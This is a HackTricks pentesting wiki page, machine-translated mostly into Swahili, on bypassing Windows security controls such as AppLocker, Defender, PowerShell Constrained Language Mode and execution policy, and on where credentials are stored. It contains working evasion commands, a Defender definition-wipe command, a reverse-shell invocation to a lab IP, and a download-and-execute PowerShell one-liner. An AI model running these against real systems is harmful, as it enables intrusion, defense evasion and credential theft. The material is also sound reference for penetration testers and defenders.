# Windows Security Controls

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Policy

Orodha ya programu inayoruhusiwa ni orodha ya programu za programu au executable ambazo zimeidhinishwa kuwa nazo na kuendesha kwenye mfumo. Lengo ni kulinda mazingira kutokana na malware hatari na programu zisizothibitishwa ambazo hazifai na mahitaji maalum ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la kuorodhesha programu** la Microsoft na inawapa wasimamizi wa mifumo udhibiti juu ya **ni programu na faili zipi watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa kina** juu ya executable, scripts, faili za installer za Windows, DLLs, programu zilizopakiwa, na waandishi wa programu zilizopakiwa.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na kuandika ufikiaji kwa baadhi ya directories, **lakini hii yote inaweza kupuuziliwa mbali**.

### Check

Check which files/extensions are blacklisted/whitelisted:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hii njia ya rejista inaelezea mipangilio na sera zinazotumika na AppLocker, ikitoa njia ya kupitia seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* **Mafolda yanayoweza kuandikwa** yenye manufaa ili kupita Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **mafolda yanayoweza kuandikwa** unaweza kutumia ili **kupita hii**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Binaries za kawaida **zilizoaminika** [**"LOLBAS's"**](https://lolbas-project.github.io/) zinaweza pia kuwa na manufaa kupita AppLocker.
* **Kanuni zilizoandikwa vibaya zinaweza pia kupitishwa**
* Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda inayoitwa `allowed`** mahali popote na itaruhusiwa.
* Mashirika mara nyingi pia yanazingatia **kuzuia `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, lakini yanakosa kuhusu **mengine** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
* **DLL enforcement mara chache huwekwa** kutokana na mzigo wa ziada inaweza kuweka kwenye mfumo, na kiasi cha upimaji kinachohitajika kuhakikisha hakuna kitu kitaharibika. Hivyo kutumia **DLLs kama milango ya nyuma kutasaidia kupita AppLocker**.
* Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Hifadhi ya Akauti

### Meneja wa Akaunti za Usalama (SAM)

Akaunti za ndani zipo katika faili hii, nywila zimepangwa.

### Mamlaka ya Usalama wa Mitaa (LSA) - LSASS

**Akaunti** (zilizopangwa) zime **hifadhiwa** katika **kumbukumbu** ya mfumo huu kwa sababu za Usajili wa Moja.\
**LSA** inasimamia **sera ya usalama** wa ndani (sera ya nywila, ruhusa za watumiaji...), **uthibitishaji**, **tokens za ufikiaji**...\
LSA itakuwa ndiyo itakayofanya **ukaguzi** wa akaunti zilizotolewa ndani ya faili **SAM** (kwa kuingia kwa ndani) na **kuzungumza** na **kikundi cha kudhibiti** ili kuthibitisha mtumiaji wa kikoa.

**Akaunti** zime **hifadhiwa** ndani ya **mchakato LSASS**: tiketi za Kerberos, hashes NT na LM, nywila zinazoweza kufichuliwa kwa urahisi.

### Siri za LSA

LSA inaweza kuhifadhi kwenye diski baadhi ya akaunti:

* Nywila ya akaunti ya kompyuta ya Active Directory (kikundi cha kudhibiti kisichoweza kufikiwa).
* Nywila za akaunti za huduma za Windows
* Nywila za kazi zilizopangwa
* Zaidi (nywila za programu za IIS...)

### NTDS.dit

Ni hifadhidata ya Active Directory. Ipo tu katika Vikundi vya Kudhibiti.

## Mlinzi

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na katika matoleo ya Windows Server. In **zuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupita ulinzi huu**.

### Angalia

Ili kuangalia **hali** ya **Mlinzi** unaweza kutekeleza cmdlet ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama inafanya kazi):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kuhesabu unaweza pia kukimbia:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS inalinda faili kupitia usimbuaji, ikitumia **funguo ya simetriki** inayojulikana kama **File Encryption Key (FEK)**. Funguo hii inasimbuliwa kwa kutumia **funguo ya umma** ya mtumiaji na kuhifadhiwa ndani ya $EFS **mchoro mbadala wa data** wa faili iliyosimbwa. Wakati usimbuaji unahitajika, **funguo ya binafsi** inayohusiana na cheti cha kidijitali cha mtumiaji inatumika kusimbua FEK kutoka kwenye $EFS mchoro. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Mifano ya usimbuaji bila kuanzishwa na mtumiaji** ni pamoja na:

* Wakati faili au folda zinahamishwa kwenye mfumo wa faili usio EFS, kama [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), zinapaswa kusimbuliwa kiotomatiki.
* Faili zilizofichwa zinazotumwa kupitia mtandao kupitia itifaki ya SMB/CIFS zinapaswa kusimbuliwa kabla ya usafirishaji.

Njia hii ya usimbuaji inaruhusu **ufikiaji wa wazi** kwa faili zilizofichwa kwa mmiliki. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia hakutaruhusu usimbuaji.

**Mambo Muhimu**:

* EFS inatumia FEK ya simetriki, iliyosimbwa kwa funguo ya umma ya mtumiaji.
* Usimbuaji unatumia funguo ya binafsi ya mtumiaji kufikia FEK.
* Usimbuaji wa kiotomatiki unafanyika chini ya hali maalum, kama vile kunakili kwenye FAT32 au usafirishaji wa mtandao.
* Faili zilizofichwa zinapatikana kwa mmiliki bila hatua za ziada.

### Angalia taarifa za EFS

Angalia kama **mtumiaji** amekuwa **akitumia** huduma hii kwa kuangalia kama njia hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **ufikiaji** wa faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimbua** na **kusimbua** faili zote

### Kusimbua faili za EFS

#### Kuwa Mamlaka ya Mfumo

Njia hii inahitaji **mtumiaji waathirika** kuwa **akifanya** **mchakato** ndani ya mwenyeji. Ikiwa hiyo ni hali, kwa kutumia `meterpreter` vikao unaweza kujifanya kuwa token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenye mchakato wa mtumiaji.

#### Kujua nenosiri la watumiaji

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zina mipangilio ya "**Nenosiri halitakoma kamwe**" iliyowekwa, gMSA hutoa suluhisho salama na linaloweza kusimamiwa zaidi:

* **Usimamizi wa Nenosiri wa Kiotomatiki**: gMSA hutumia nenosiri tata, la herufi 240 ambalo hubadilika kiotomatiki kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Funguo ya Microsoft (KDC), ikiondoa haja ya masasisho ya nenosiri ya mikono.
* **Usalama Ulioimarishwa**: Akaunti hizi hazihusiki na kufungwa na haziwezi kutumika kwa kuingia kwa mwingiliano, kuimarisha usalama wao.
* **Msaada wa Wenyeji Wengi**: gMSA zinaweza kushirikiwa kati ya wenyeji wengi, na kuifanya kuwa bora kwa huduma zinazofanya kazi kwenye seva nyingi.
* **Uwezo wa Kazi Iliyopangwa**: Tofauti na akaunti za huduma zinazodhibitiwa, gMSA zinasaidia kufanya kazi zilizopangwa.
* **Usimamizi wa SPN Ulio Rahisishwa**: Mfumo unasasisha kiotomatiki Jina la Kitaalamu la Huduma (SPN) wakati kuna mabadiliko katika maelezo ya sAMaccount ya kompyuta au jina la DNS, kuimarisha usimamizi wa SPN.

Nenosiri za gMSA zinahifadhiwa katika mali ya LDAP _**msDS-ManagedPassword**_ na zinarejeshwa kiotomatiki kila siku 30 na Wasimamizi wa Kikoa (DCs). Nenosiri hili, blob ya data iliyosimbwa inayojulikana kama [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), linaweza kupatikana tu na wasimamizi walioidhinishwa na seva ambazo gMSA zimewekwa, kuhakikisha mazingira salama. Ili kufikia taarifa hii, unahitaji muunganisho salama kama LDAPS, au muunganisho lazima uthibitishwe na 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Unaweza kusoma nenosiri hili kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia hii [ukurasa wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kufanya **NTLM relay attack** ili **kusoma** **nenosiri** la **gMSA**.

## LAPS

**Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakua kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inaruhusu usimamizi wa nenosiri za Msimamizi wa ndani. Nenosiri haya, ambayo ni **ya nasibu**, ya kipekee, na **yanabadilishwa mara kwa mara**, huhifadhiwa kwa kati katika Active Directory. Ufikiaji wa nenosiri haya umewekwa vizuizi kupitia ACLs kwa watumiaji walioidhinishwa. Kwa ruhusa ya kutosha, uwezo wa kusoma nenosiri za admin wa ndani unapatikana.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inafungia mbali vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu tu aina za .NET zilizothibitishwa, michakato ya XAML, madarasa ya PowerShell, na zaidi.

### **Angalia**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Kupita
```powershell
#Easy bypass
Powershell -version 2
```
Katika Windows ya sasa, Bypass hiyo haitafanya kazi lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikamilisha unaweza kuhitaji** **kui** _**Ongeza Rejeleo**_ -> _Browse_ ->_Browse_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.

#### Bypass ya moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Sera ya Utekelezaji wa PS

Kwa default imewekwa kuwa **imezuiliwa.** Njia kuu za kupita sera hii:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Ni API ambayo inaweza kutumika kuthibitisha watumiaji.

SSPI itakuwa na jukumu la kutafuta itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendekezwa kwa hili ni Kerberos. Kisha SSPI itajadili itifaki ipi ya uthibitishaji itatumika, hizi itifaki za uthibitishaji zinaitwa Security Support Provider (SSP), ziko ndani ya kila mashine ya Windows katika mfumo wa DLL na mashine zote mbili lazima ziunge mkono ile ile ili kuweza kuwasiliana.

### Main SSPs

* **Kerberos**: Ile inayopendekezwa
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** na **NTLMv2**: Sababu za ulinganifu
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Seva za wavuti na LDAP, nenosiri katika mfumo wa MD5 hash
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL na TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Inatumika kujadili itifaki ya kutumia (Kerberos au NTLM, Kerberos ikiwa chaguo la msingi)
* %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kiashiria cha idhini kwa shughuli zilizoinuliwa**.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kujiendesha kiotomatiki** kwa urahisi kwa kutumia zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
